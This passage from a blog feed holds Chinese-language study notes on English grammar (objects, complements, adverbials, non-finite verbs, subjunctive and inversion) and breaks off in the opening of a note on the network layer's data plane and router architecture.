      <url>/English/G/06-%E5%AE%BE%E8%AF%AD.html</url>
      
        <content type="html"><![CDATA[<p> 不同常规的教学方法, 方便理解而不至于死记硬背</p><span id="more"></span><h2 id="宾语"><a href="#宾语" class="headerlink" title="宾语"></a>宾语</h2><p> 产生宾语的情况</p><h3 id="谓语如果是实义动词"><a href="#谓语如果是实义动词" class="headerlink" title="谓语如果是实义动词"></a>谓语如果是实义动词</h3><ol><li><p><code>S+Vt1+O(动宾)</code></p><p>I play football.</p></li><li><p><code>S+Vt1+O+OC(Object Complement, 宾补)</code></p></li><li><p><code>S+Vt2+IO(Indirect Object,间宾)+DO(Direct Object,直宾)</code>[不好意思, 这么写真的是职业病]</p><p>I told <u>her</u> <u>a story</u>.</p></li><li><p><code>S+Vi+Preposition(介词)+O(介宾)</code></p></li></ol><blockquote><p>广义与狭义宾语之分</p><p>He is reading <u>a book</u> <u>under the tree</u>.</p><p>狭义上a book是宾语, 后面是状语</p><p>广义上a book是宾语, 介词后面也是宾语.</p></blockquote><p><u><strong>练习1: 判断宾语</strong></u></p><ul><li><p>I wanted <u>to buy a car</u>(O).</p><p>to buy是不定式</p></li><li><p>I enjoy(vt) <u>listening to popular music</u>(O).</p><p>to是介词, 介宾, listening是动名词, 组合起来才是真正的宾语</p></li><li><p>Look at <u>the man</u>(O).</p><p>祈使句, at是介词</p></li><li><p>I think <u>(that) he is fit for his office</u>.</p><p>句子做宾语, 叫宾语从句</p></li></ul><h4 id="双宾语之间宾直宾"><a href="#双宾语之间宾直宾" class="headerlink" title="双宾语之间宾直宾"></a>双宾语之间宾直宾</h4><p>能有双宾语的句子需要满足三个条件</p><ol><li>动词可以接两个主体(指间宾直宾)</li><li>这两个主体可以变序</li><li>有两个主体</li></ol><p><strong>不同的动词后面的两个宾语之间可能会有不同的介词</strong></p><ul><li>使用to连接间宾: allow, bring, deny, grant, hard, leave, lend, offer, owe, pass, pay, permit, read, refuse, sell, send, show, teach, tell, wish, write.等<ul><li>S+V+IO+DO: She told me a joke.</li><li>S+V+DO+IO: She told a joke <strong>to</strong> me. </li></ul></li><li>使用for连接间宾: buy, choose, fetch, get, make, order, paint, play, save, sing, spare等<ul><li>S+V+IO+DO: She bought me a book.</li><li>S+V+DO+IO: She bought a book <strong>for</strong> me.</li></ul></li></ul><blockquote><p>什么时候使用to, 什么时候使用for?</p><p>老师将它们分为参与与不参与的情况, 如told的过程需要me参与, bought的过程不需要么参与</p><p>具体什么时候使用for/to参考网站<a href="http://www.yygrammar.com/Article/201602/4751.html">http://www.yygrammar.com/Article/201602/4751.html</a></p></blockquote><h4 id="宾语补足语"><a href="#宾语补足语" class="headerlink" title="宾语补足语"></a>宾语补足语</h4><p>例句: She made me sad.</p><p>对比双宾语: She told me a joke.</p><p>由此得到他们的不同点</p><table><thead><tr><th>宾补</th><th>双宾语</th></tr></thead><tbody><tr><td>Vt1</td><td>Vt2</td></tr><tr><td>一个主体</td><td>两个主体(注意这两个主体是没有联系的)</td></tr><tr><td>不可变序</td><td>可以变序</td></tr></tbody></table><p><u><strong>补足语练习</strong></u></p><ol><li><p>His father named <u>him</u>(O) <u>Dongming</u>(OC).</p></li><li><p>They painted <u>their boat</u>(O) <u>white</u>(OC).</p></li><li><p>Let <u>the fresh air</u>(O) <u>in</u>(OC).</p></li><li><p>We saw <u>her</u>(O) <u>entering the room.</u>(OC)</p></li><li><p>You mustn’t force <u>him</u>(O) <u>to lend his money to you.</u>(OC)</p></li><li><p>We found <u>everything</u>(O) in the lab <u>in good order</u>.(OC)</p><p>analysis: in the lab是定语, 将everything缩小了, 而补语是对everything的补充, 不会将它缩小.</p></li><li><p>I want <u>your homework(O)</u> <u>done(OC)</u> on time.</p></li><li><p>We will soon make <u>our city</u>(O) <u>what your city is now.</u>(OC, 这是补语从句)</p></li></ol><h4 id="宾语从句"><a href="#宾语从句" class="headerlink" title="宾语从句"></a>宾语从句</h4><p>句子作为宾语.</p><p>总共有以下五种宾语, 对应五种宾语从句</p><p><strong>介宾</strong>: S+Vi+prep+O<span style='color:red;'>①</span></p><ul><li>I am thinking of <strong>what I can do.</strong></li></ul><p><strong>动宾</strong>: S+Vt1+O<span style='color:red;'>②</span></p><ul><li>I think <strong>that you are pig</strong> </li></ul><p><strong>宾补</strong>:S+Vt1+O<span style='color:red;'>③</span>+OC</p><ul><li>I think <strong>that we learn English well</strong> important.</li></ul><p><strong>间宾直宾</strong>: S+Vt2+IO<span style='color:red;'>④</span>+DO<span style='color:red;'>⑤</span></p><ul><li>I will give <strong>whoever comes first whoever he or she wants.</strong></li></ul><p><u><strong>练习例句</strong></u></p><ul><li><p>We all think it a pity that she didn’t come here.</p><p>analysis: it做形式宾语, a pity是宾补, that she didn’t come here是宾语</p></li></ul><h3 id="谓语如果是系动词"><a href="#谓语如果是系动词" class="headerlink" title="谓语如果是系动词"></a>谓语如果是系动词</h3><p>老师将系动词+表语也分为了vi和vt两种(实际上没有, 这是为了方便理解)</p><ul><li><p>vi</p><p>You are a good person.</p><p>I am interested <strong>in it.</strong>(介词+宾)</p></li><li><p>vt</p><p>I am afraid(adj) <strong>that you are wrong.</strong>(这里类似宾补, that就是补语从句, 呈上所以有6种宾语从句)</p></li></ul><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><h3 id="主语补足语"><a href="#主语补足语" class="headerlink" title="主语补足语"></a>主语补足语</h3><p>有宾语补足语的句子变成被动语态, 宾语变为主语, 宾补也变成了主补, 主补就是对主语的补充说明.</p><p>eg: His father named him Rick(宾补).</p><p>转换成被动: He was named Rick(主补) <u>by his father(方式状语, 通常省略).</u>  </p><p><strong>*<u>更多主补句子</u>*</strong></p><ul><li>She was found <u>singing in the next room</u>.</li><li>He was advised <u>to teach the lazy boy a lesson.</u></li></ul><h2 id="表语"><a href="#表语" class="headerlink" title="表语"></a>表语</h2><p>在系动词后面就是表语.</p><p><em>判定是否主系表时, 将谓语动词换为be动词, 如果意思相近就是主系表</em></p><p><strong>例句</strong></p><ul><li>Our teacher of English is <u>an American</u>.</li><li>Is it <u>yours</u>?(it is yours)</li><li>The weather <u>has turned(系动词)</u> <u>cold</u>.</li><li>The truth is <u>that he has nerver been abroad.(表语从句)</u></li></ul><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>主语和宾语的类型只能是名词,句子, 而表语由<strong>形容词</strong>, 副词, <strong>句子</strong>和<strong>介词短语</strong>充当</p><ul><li>He is here.</li><li>He is out.</li></ul><h3 id="There-be"><a href="#There-be" class="headerlink" title="There be"></a>There be</h3><p>中文意思是：<strong>有</strong></p><p>为了深入理解这东西, 需要知道两个背景知识</p><ul><li>倒装—方位介词提前</li><li>主系表结构倒装既是完全倒装也是不完全倒装</li></ul><p>接下来将一个主系表句子倒装</p><ul><li>A book is <strong>on the desk</strong>.</li></ul><p>倒装: <strong>On the desk</strong> is a book.</p><p>这样就”头重脚轻”了, 在主谓宾的倒装句子中, 使用<code>it</code>作形式主语/宾语, 因为<code>it</code>是带名词性的, 但<code>On the desk</code>不同, 它是介词短语(介词+名词), 所以不能用<code>it</code>, 那用什么? 没错, 就是<code>There</code>!</p><p>There be: <strong>There</strong> is a book on the desk.</p><blockquote><p>There是形式表语, on the desk是表语</p></blockquote><p><strong>be与后面的主语人称和数要一致, 有时态和数的变化.</strong></p><ol><li>现在时: there is/are…</li><li>过去时: there was/were..</li><li>将来时: there will be../there is/are going to be..</li><li>完成时: there has/have been..</li><li>可能有: there might be..</li><li>肯定有: there must be../there must have been..</li><li>过去曾经有: there used to be..</li><li>似乎有: there seem/seems/seemed to do..</li><li>碰巧有: there happen/happens/happened to do..</li></ol><p><strong>可用 live, stand, come, go, lie, remain, exist, arrive 等词代替be动词</strong>, 表意更具体</p><ul><li>There lived an old man at the foot of the mountain.</li><li>There came <u>a shout for ‘help’</u>.(V+S, not P)</li><li>There exists on air on the moon.</li><li>There lies a book on the desk.</li><li>There stands a tree on the hell.</li></ul><h2 id="同位语"><a href="#同位语" class="headerlink" title="同位语"></a>同位语</h2><p>将两个名词放在主语or宾语位置上, 这两个地位同等</p><ul><li><p><strong>Shepherd, a 19-year-old boy,</strong> is a bad student</p></li><li><p><u>we</u> <u>all</u> love you.</p></li></ul><h2 id="区分宾补-定语-同位语"><a href="#区分宾补-定语-同位语" class="headerlink" title="区分宾补,定语,同位语"></a>区分宾补,定语,同位语</h2><table><thead><tr><th></th><th>同位语</th><th>宾补</th><th>定语</th></tr></thead><tbody><tr><td>词性</td><td>只能是名词</td><td>名词, 形容词, 介词, 副词, 不定式, 现在分词, 过去分词</td><td>副词, 形容词, 介词, 不定式, 现在分词, 过去分词</td></tr><tr><td>顺序</td><td>可变可不变</td><td>不能变序</td><td>可以变序</td></tr><tr><td>范围</td><td>不变</td><td>不变</td><td>缩小</td></tr></tbody></table><h3 id="同位语VS宾补"><a href="#同位语VS宾补" class="headerlink" title="同位语VS宾补"></a>同位语VS宾补</h3><p>同位语: I love <strong>him Morty</strong>.(这个Morty===him)</p><p>宾补: His father named <strong>him Morty</strong>.(Morty属于him, him还有其他很多东西)</p><h3 id="宾补VS后置定语"><a href="#宾补VS后置定语" class="headerlink" title="宾补VS后置定语"></a>宾补VS后置定语</h3><p>宾补: I saw <strong>the boy playing basketball</strong>.(playing basketball只是the boy的一个角度, 这里明确了the boy)</p><p>后置定语: The boy <strong>playing basketball</strong> is Tom.(the boy是一个笼统的词, 定语将它范围缩小了)</p><h3 id="同位语VS后置定语"><a href="#同位语VS后置定语" class="headerlink" title="同位语VS后置定语"></a>同位语VS后置定语</h3><p>同位语: <strong>Tom, a student</strong>, studies hard.</p><p>非限制后置定语: Tom, who is a student, studies hard.</p><blockquote><p>一句话理解: I think the boy <u>playing basketball</u>(后置定语), Tom(同位语), handsome(OC).</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>05-副词与状语</title>
      <link href="/English/G/05-%E5%89%AF%E8%AF%8D%E4%B8%8E%E7%8A%B6%E8%AF%AD.html"/>
      <url>/English/G/05-%E5%89%AF%E8%AF%8D%E4%B8%8E%E7%8A%B6%E8%AF%AD.html</url>
      
        <content type="html"><![CDATA[<p> 老师将主语(笼统)比作太阳系模型[同一角度下不断具体], 谓语比作摩天轮模型[不同角度进行描述], 有点意思.</p><span id="more"></span><h2 id="状语adv"><a href="#状语adv" class="headerlink" title="状语adv"></a>状语adv</h2><p>修饰<strong>动词v, 形容词n, 副词adv, 或整个句子</strong>.</p><p>摩天轮模型说的就是<strong>修饰动词</strong>. </p><p><strong>例子</strong></p><ul><li>He writes(V) carefully(adv).</li><li>He runs(V) very(adv) slowly(adv).[slowly修饰runs, very修饰slowly]</li><li>Unfortunately(adv), he lost all of his money.</li></ul><blockquote><p>特例: <u>Unluckily</u>, I got up <u>very</u> <u>late</u> <u>today</u>.</p><p>Unluckily修饰整个句子, late修饰谓语, very修饰late, <strong>today修饰整句话或者动词</strong></p><p><strong>today也有adv</strong></p></blockquote><h3 id="频度副词"><a href="#频度副词" class="headerlink" title="频度副词"></a>频度副词</h3><p>always总是, usually经常, often通常, sometimes有时, seldom很少, hardly(ever)几乎不 , never绝不 等.(主观上)</p><p><strong>在句子中位于助动词, 系动词之后, 实义动词之前.</strong></p><p><strong>表达次数的方式</strong></p><ul><li>次数+时间: once a week</li><li>频度: often..</li></ul><p><strong>例子</strong></p><ul><li>You can <strong>never</strong> tell what he will do.</li><li>He is <strong>often</strong> late.</li><li>He is <strong>always</strong> helping others.</li><li>He <strong>often</strong> came late.</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>状语修饰动词, 于是将状语分类, 有<strong>时间, 地点, 原因, 目的, 结果, 程度, 条件(if then), 方式, 让步, 比较, 伴随(方式的同时又做别的事)</strong>等等</p><p>这就叫摩天轮模型, 有许多的状语类来修饰同一动词     </p><p><strong>练习</strong>: 下面划线部分是什么类型的状语.</p><ul><li><p>How about meeting again <u>at six</u>?</p><p>很明显, 这是时间状语</p></li><li><p>Mr. Smith lives <u>on the third floor</u>?</p><p>地点状语</p></li><li><p>Last night she didn’t go to the dance party <u>because of the rain</u>.</p><p>原因状语</p></li><li><p>She put the eggs into the basket <u>with great care</u>.</p><p>great修饰care(程度), 但这整个状语实际上是方式状语</p></li><li><p>She came in <u>with a dictionary in her hand</u>.</p><p>她走进来的同时拿着一本字典, 伴随状语</p></li></ul><blockquote><p><strong>方式与伴随状语</strong></p><ul><li><p>方式类似How, 怎么做的</p></li><li><p>伴随类似ing, 强调同时发生</p></li></ul></blockquote><ul><li><p><u>To make his dream come true</u>, Tom becomes very interested in business.</p><p>目的</p></li><li><p>The boy <u>really</u> needs a pen.</p><p>程度</p></li><li><p>He was so tired <u>that he fell asleep immediately</u>.</p><p>so..that..如此..以至于..原因状语</p></li><li><p>She works very hard <u>though she is old.</u></p><p>即便她老了工作也很努力. 这里的主观里老是最”糟糕”的情况, 给中青年让步了. </p><p>所以是让步状语</p></li></ul><blockquote><p>让步就是想说某种情况, 却说了与这个情况的对立面来反衬该情况(落差).</p><p>比如:</p><ul><li><p>我爱你</p></li><li><p>就算世界毁灭我也爱你.</p></li></ul><p>世界毁灭我都爱你, 更何况其他情况呢, 这就是对其他情况的让步</p><p>我不知道这解释你懂了没, 反正我是没懂..我都不知道我在说啥, 草</p></blockquote><ul><li><p>I am taller <strong>than he is.</strong></p><p>比较</p></li><li><p>I shall go there <u>if it doesn’t rain</u>.</p><p>条件</p></li><li><p><u>Having to finish his homework</u>, the boy needs a pen.</p><p>因为作业驱动男孩需要一支笔, 所以这是原因状语.</p></li></ul><blockquote><p><strong>更深层次的理解状语类型</strong></p><p>老师为了帮助理解状语, 加入了一个时间维度的模型—-<strong>行为</strong></p><p>原因, 条件状语在行为<strong>之前</strong>发生</p><ul><li>原因驱动行为</li><li>先有条件, 才有行为</li></ul><p>目的, 结果状语在行为<strong>之后</strong>发生</p><ul><li>这个行为 为了什么目的</li><li>行为的结果</li></ul><p>其他类型的状语都发生在行为中</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>04-非谓语</title>
      <link href="/English/G/04-%E9%9D%9E%E8%B0%93%E8%AF%AD.html"/>
      <url>/English/G/04-%E9%9D%9E%E8%B0%93%E8%AF%AD.html</url>
      
        <content type="html"><![CDATA[<p>要理解非谓语首先要知道抽象思维: 透过表象看本质.</p><span id="more"></span><p>非谓语总的有三大类</p><ul><li><strong>to do</strong></li><li><strong>doing</strong></li><li><strong>done</strong></li></ul><table><thead><tr><th>例子</th><th>类型</th><th>例子</th><th>类型</th></tr></thead><tbody><tr><td>to be having</td><td>to do</td><td>to have written</td><td>to do</td></tr><tr><td>playing</td><td>doing</td><td>written</td><td>done</td></tr><tr><td>being built</td><td>doing</td><td>to come</td><td>to do</td></tr><tr><td>gone</td><td>done</td><td>drunk</td><td>done</td></tr></tbody></table><blockquote><p>注意: 有些词的过去式和过去分词是一样的, 这时区分非谓语需要看语境</p><p>如: make made made</p><ul><li>She <strong>made</strong> the cake.[主动作谓语]</li><li>The cake <strong>made</strong> by her is good.[被动作非谓语]</li></ul></blockquote><h2 id="谓语和非谓语"><a href="#谓语和非谓语" class="headerlink" title="谓语和非谓语"></a>谓语和非谓语</h2><p>谓语由动词构成, 但动词不只构成谓语, 它还可以构成非谓语.</p><h3 id="产生谓语的条件"><a href="#产生谓语的条件" class="headerlink" title="产生谓语的条件"></a>产生谓语的条件</h3><ol><li>S+V</li><li>S+V (and-or-but) V/S+V,V and V.</li><li>S+V 连接词(并, 介) S+V.</li></ol><blockquote><p>英语第一原则:</p><p>在主谓结构里面, 只能有一个谓语(其他都是非谓语)</p></blockquote><h3 id="非谓语的本质"><a href="#非谓语的本质" class="headerlink" title="非谓语的本质"></a>非谓语的本质</h3><table><thead><tr><th>名称</th><th>抽象</th><th>本质</th><th>运用</th></tr></thead><tbody><tr><td>不定式</td><td>to do</td><td>不确定</td><td>将来, 目的, 一次性</td></tr><tr><td>动名词</td><td>doing</td><td>确定</td><td>长期, 稳定, 习惯</td></tr><tr><td>分词–&gt;现在分词</td><td>doing</td><td>分身</td><td>与谓语动词同步发生</td></tr><tr><td>\–&gt;过去分词</td><td>done(vi/vt)</td><td>省略</td><td>vi: 完成. vt: 完成, 被动</td></tr></tbody></table><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ol><li>I would like <u><strong>to come</strong></u>[come] to your party.(不定式)</li><li>[smoke]<u><strong>smoking</strong></u> is bad.(动名词)</li><li>I sat there, <u><strong>thinking</strong></u>[think] of her.(现在分词, 我坐在那里, [同时]想着它)</li><li>I found her <u><strong>gone</strong></u>[go].(vi done, 我发现它<strong>走</strong>了)</li><li>I found my bike <u><strong>stolen</strong></u>[steal].(vt done, 我发现我的自行车<strong>被偷</strong>了)</li></ol><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p>找出下面句子的谓语, 然后改正错误.</p><ol><li><p><u>Get up</u> early <u>is</u> good for our health.</p><p>analysis: is是一个系动词, 真正的谓语, 而Get up是长期的/习惯性的, 需要改成doing形式</p><p>amend: <strong>Getting</strong> early is good for our health.</p></li><li><p>I <u>want</u> <u>go</u> home now.</p><p>analysis: want是I产生的谓语, 而go home是不确定的/目的性的</p><p>amend:  I want <strong>to</strong> <strong>go</strong> home now.</p></li><li><p>My favorite sport <u>is</u> <u>play</u> football.</p><p>analysis: 主系表结构, is才是谓语, play football是长期的</p><p>amend: My favorite sport is <strong>playing</strong> football.</p></li><li><p>There <u>is</u> a bird <u>sings</u> in the tree.</p><p>analysis: is是谓语, sings应该与它同步发生(现在分词)</p><p>amend: There is a bird <strong>singing</strong> in the tree.</p></li><li><p>The boy <u>sits</u> over there <u>likes</u> singing.</p><p>analysis: sits属于定语, 修饰主语, 真正的谓语是likes, sits应该与likes同步发生</p><p>amend: The boy <strong>sitting</strong> over there  likes singing.</p></li><li><p>The house <u>was built</u> last year <u>has been sold out</u>.</p><p>analysis: 谓语是has been sold out. was built限制The house, 属于后置定语, 而house与built是被动关系</p><p>amend: The house <strong>built</strong> last year has been sold out.</p></li><li><p>My parents <u>wanted</u> him <u>work</u> hard.</p><p>analysis: wanted是parents产生的谓语, work是不确定的</p><p>amend: My parents wanted him to work hard.</p></li><li><p>I <u>remember</u> <u>saw</u> him that day.</p><p>analysis: saw是did形式, do形式是see, 应该改为doing形式(确定)</p><p>amend: I remember seeing him that day.</p></li></ol><blockquote><p>然而一个句子中是可以存在两个do的, 它还是代表一个谓语, 一个非谓语, 下面是老师的分析:</p><table><thead><tr><th><strong>看见</strong>(谓语)</th><th><strong>某人</strong></th><th><strong>做某事</strong>(非谓语)</th></tr></thead><tbody><tr><td>see</td><td>sb</td><td>正在做—doing</td></tr><tr><td></td><td></td><td>做完了—<del>to</del> do</td></tr><tr><td></td><td></td><td>被做—done(vt)</td></tr><tr><td></td><td></td><td><del>要做</del></td></tr></tbody></table><p>英语是一个严谨的语言, 看不到要发生的事.</p><p>to do本质不确定, 折中后省略to表示做完了(整个过程).</p><p><strong>例子</strong></p><p>主动省to, 被动还原</p><ul><li>主动: I saw her <del>to</del> <strong>go</strong> into the room.</li><li>被动(be+done): She was seen <strong>to</strong> go into the room.</li></ul><p>英语的被动都偏向不确定(to do)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>03-谓语/虚拟语气/倒装</title>
      <link href="/English/G/03-%E8%B0%93%E8%AF%AD%E8%99%9A%E6%8B%9F%E8%AF%AD%E6%B0%94%E5%80%92%E8%A3%85.html"/>
      <url>/English/G/03-%E8%B0%93%E8%AF%AD%E8%99%9A%E6%8B%9F%E8%AF%AD%E6%B0%94%E5%80%92%E8%A3%85.html</url>
      
        <content type="html"><![CDATA[<p> 谓语是句子的重要部分，由动词构成</p><span id="more"></span><h2 id="简单的谓语构成"><a href="#简单的谓语构成" class="headerlink" title="简单的谓语构成"></a>简单的谓语构成</h2><ol><li><p>实义动词(词组)单独构成</p><ul><li><p>I <strong>like</strong> English.</p></li><li><p>He <strong>practices</strong> running every morning.</p></li></ul><p>词组</p><ul><li>I <strong>find out</strong> the truth.</li><li>I <strong>look at</strong> the bird.(vi+介)</li></ul></li><li><p>系动词单独构成+表语</p><ul><li>He <strong>is</strong> a student.(表状态)</li><li>We <strong>are</strong> students.</li><li>Your idea <strong>sounds</strong> great.(听起来,感官)</li></ul></li></ol><blockquote><p>小技巧: 将系动词换为be动词差别不大说明是系动词</p><ul><li>Your idea <strong>sounds(is)</strong> great.(区别不大,是系动词)</li><li>I <strong>have(am)</strong> a dream.(区别很大,不是系动词)</li></ul></blockquote><ol start="3"><li><p>助动词+实义动词/系动词</p><p>助动词+实义</p><ul><li>You <strong>can help</strong> me.</li><li>You <strong>may keep</strong> the book for two weeks.</li><li>He <strong>has caught</strong> a bad cold. </li><li>My sister <strong>is crying</strong> over there.</li><li>I <strong>have been waiting</strong> for you all the time.(两个助动词)</li><li>I <strong>would stay</strong> at home all day.</li></ul><p>助动词+系动词</p><ul><li>[Be]He <strong>is being</strong> a student.(be+doing表进行,be+done表被动)</li><li>[情]He <strong>can be</strong> a student.(情态动词+动词原形)</li><li>[狭义]He <strong>does be</strong> a student.(一般不这么说)</li><li>[完成]He <strong>has been</strong> a student for five years.(完成助动词+动词过去分词形式)</li></ul></li></ol><h2 id="复合谓语公式"><a href="#复合谓语公式" class="headerlink" title="复合谓语公式"></a>复合谓语公式</h2><p>情态动词+完成助动词+be动词+实义动词+介词</p><p>would+have+been+looking+for..</p><h2 id="虚拟语气基础"><a href="#虚拟语气基础" class="headerlink" title="虚拟语气基础"></a>虚拟语气基础</h2><p>虚拟代表它不是真的.</p><p>先看看真实的情况: </p><ol><li>I <strong>am</strong> a student [now].</li><li>I <strong>was</strong> a student [before].</li><li>I <strong>will</strong> be a student [in the futrue].</li></ol><p>可以看到,这些谓语都很精确的代表了<code>现在</code>,<code>过去</code>,<code>将来</code>.</p><p>不用在后面添加[]的内容.</p><p>而虚拟语气就是将<strong>时态前移</strong>,使谓语不精确</p><table><thead><tr><th>时态</th><th>前移时态</th><th></th></tr></thead><tbody><tr><td>do, does(一般现在)</td><td>did(一般过去)</td><td></td></tr><tr><td>did(一般过去)</td><td>had done(过去完成)</td><td></td></tr><tr><td>will do(一般将来)</td><td>would do(过去将来)</td><td>would have done(将来完成)</td></tr><tr><td>have/has done(现在完成)</td><td>had done(过去完成)</td><td></td></tr></tbody></table><p>虚拟语气常常有<strong>if</strong>.</p><p>如:If he <strong>had come</strong> yesterday, I <strong>wouldn’t have made</strong> such a mistake.</p><p>将它变成真实的情况: He <strong>came</strong> yesterday, I <strong>would make</strong> such a mistake.</p><h2 id="倒装基础"><a href="#倒装基础" class="headerlink" title="倒装基础"></a>倒装基础</h2><p>陈述是<strong>S+V</strong>,而倒装则是<strong>V+S</strong>.但倒装又分为完全倒装和部分倒装.</p><p>倒装是有条件的,不是想倒就倒的.</p><h3 id="完全倒装"><a href="#完全倒装" class="headerlink" title="完全倒装"></a>完全倒装</h3><ol><li><p><strong>方位 介词 提前</strong></p><p>陈述: The boy <strong>sits</strong> <strong>under</strong> the tree.</p><p>倒装: <strong>Under</strong> the tree <strong>sits</strong> the boy.</p></li><li><p><strong>方位 副词 提前</strong></p><p>陈述: The bus <strong>comes</strong>(vi) <strong>here</strong>(adv).</p><p>倒装: <strong>Here comes</strong> the bus.</p></li></ol><blockquote><p><strong>注意</strong>: 如果主语是人称代词,则不用倒</p><p>He comes here.–&gt;Here he comes.</p></blockquote><h3 id="部分倒装"><a href="#部分倒装" class="headerlink" title="部分倒装"></a>部分倒装</h3><ol><li><p><strong>否定 介词 提前</strong></p><p>陈述: I <strong>will</strong>(助) <u><strong>by no means</strong></u> <strong>forget</strong>(实义) her.</p><p>倒装: <strong>By no means will</strong> I <strong>forget</strong> her.</p></li><li><p><strong>否定 副词 提前</strong></p><p>陈述: I <strong>will never(adv) forget</strong> her.</p><p>倒装: <strong>Never will</strong> I <strong>forget</strong> her.</p></li></ol><blockquote><p>句子如果是主系表结构, 将系动词提前既是完全倒装也是不完全倒装</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.网络层-数据平面</title>
      <link href="/Networking/Top-Down-Note/Data-Plane.html"/>
      <url>/Networking/Top-Down-Note/Data-Plane.html</url>
      
        <content type="html"><![CDATA[<p> 网络层分两部分讲解，数据平面和控制平面(区分这两个概念很重要)，该章主要讲解了数据报输入输出链路的选择、IP转发、通用转发、IPv4和IPv6.</p><blockquote><p>理清楚术语有利于学习本章: 数据包和分组是同一概念, 都是packet翻译过来的. 数据报和数据包有点类似, 比如UDP数据报, IP数据报, TCP数据包, UDP数据包, IP数据包..</p></blockquote><span id="more"></span><h2 id="4-1-Overview"><a href="#4-1-Overview" class="headerlink" title="4.1-Overview"></a>4.1-Overview</h2><p>路由器的数据平面将数据报从输入链路<strong>转发</strong>到输出链路，网络控制平面主要控制着数据报进行端到端传输。</p><h3 id="4-1-1-转发和路由-数据和控制平面"><a href="#4-1-1-转发和路由-数据和控制平面" class="headerlink" title="4.1.1-转发和路由-数据和控制平面"></a>4.1.1-转发和路由-数据和控制平面</h3><p>将数据发送至目标主机，有两个重要的网络层功能。</p><ul><li><strong>转发</strong>：数据包在单一路由器里从输入到选择合适的输出链路（几纳秒），对应<strong>数据平面</strong></li><li><strong>路由</strong>：网络层必须在所有路由器中确定数据包采用的路由或路径（几秒），相关算法称为路由算法，对应<strong>控制平面</strong></li></ul><p>路由器的关键是<strong>转发表</strong>，路由器会检查每个数据包首部字段，查询转发表以确定输出链路。</p><p><em>控制平面的传统方法</em></p><p>每个路由器都有一个可以和其他路由器通信的路由组件，路由器之间通过通信计算转发表的值</p><p><em>控制平面的SDN方法</em></p><p>(software-defined networking, SDN)将控制平面提升到了远程控制，通过远程控制器来分配转发表的值。</p><h3 id="4-1-2-网络服务模型"><a href="#4-1-2-网络服务模型" class="headerlink" title="4.1.2-网络服务模型"></a>4.1.2-网络服务模型</h3><p>网络服务模型定义了发送方与接收方之间数据包的传递特性.</p><p>网络层<em>能提供</em>的<strong>部分服务:</strong></p><ul><li><strong>保证交付数据</strong>: 确保源数据包可以到达目的主机. 此外还可以指定时延范围进行传递</li><li><strong>有序的数据包</strong>: 保证数据包按照发送顺序到达目的主机. </li><li><strong>*保证最小带宽</strong>: 在指定的链路速率下, 只要发送速率低于链路速率, 那么所有数据包都会到达目的主机.  </li><li><strong>安全性</strong>: 在源主机进行加密, 目的主机进行解密即可保证安全性.</li></ul><p>但是Internet网络层提供的是<strong>尽力而为服务</strong>, 不保证<strong>到达-延迟-带宽,</strong> 虽然有其他模型满足上述服务, 但事实证明了尽力而为服务和现下非常契合. </p><blockquote><p>注意: 有两种类型交换机, 针对网络层的叫数据包交换机, 转发策略根据数据包头的信息决定, 通俗来说把数据包交换机叫路由器; 针对链路层的交换机是链路层设备. </p></blockquote><h2 id="4-2-路由器组成和作用"><a href="#4-2-路由器组成和作用" class="headerlink" title="4.2-路由器组成和作用"></a>4.2-路由器组成和作用</h2><p>路由器架构如图</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/router-architecture.png" alt="router-architecture"></p><ul><li><p><strong>输入端口</strong></p><p>这个端口不是TCP套接字的端口, 而是代表物理端口(或者说接口更合适), 图中三个方框分别代表物理层, 链路层, 网络层. </p></li></ul><p>  功能: 1. 物理链路与物理层的交互. 2. 链路层的交互. 3. 网络层, 查询转发表将数据包通过<strong>交换结构</strong>转发到输出接口. </p><ul><li><p><strong>交换结构</strong></p><p>将输入端口连接到输出端口, 它完全包含在路由器中, 是一个网络路由器中的网络. </p></li><li><p><em>*输出端口</em></p><p>存储从交换结构得到的数据包, 通过执行链路层和物理层的功能后在传输链路上进行传输(也可以取消). 如果链路是双向传输, 则输入和输出端口在印刷电路上有特殊的结构</p></li><li><p><strong>路由处理器</strong></p><p>执行的是控制平面的功能. </p><p>在传统的路由器中, 执行<strong>路由器协议</strong>, 维护路由表和链路状态信息, 并计算转发表.</p><p>在SDN的路由器中, 它负责和远程控制器通信, 为路由器计算转发表</p></li></ul><blockquote><p>各个部分都使用了物理硬件来实现, 因为数据到达通常是ns级的, 对于软件来说太快了</p></blockquote><h3 id="4-2-1-输入端口细节"><a href="#4-2-1-输入端口细节" class="headerlink" title="4.2.1-输入端口细节"></a>4.2.1-输入端口细节</h3><p>输入端口通过<code>转发表</code>来找输出端口, 而转发表则由<code>路由处理器</code>计算或者从<code>SDN</code>接受. 转发表通过一条总线复制到每个端口, 避免了集中处理.</p><p>在32位的IP地址中, 转发表如果为每一个可能的地址都分配了一个条目, 而地址可能有40多亿, 这不大现实. 一般来说, 会在某段地址范围之间选择一个链接接口. 也会采用前缀的形式进行选择, 如下</p><table><thead><tr><th>IP前缀</th><th>转发链路接口</th></tr></thead><tbody><tr><td>11001000 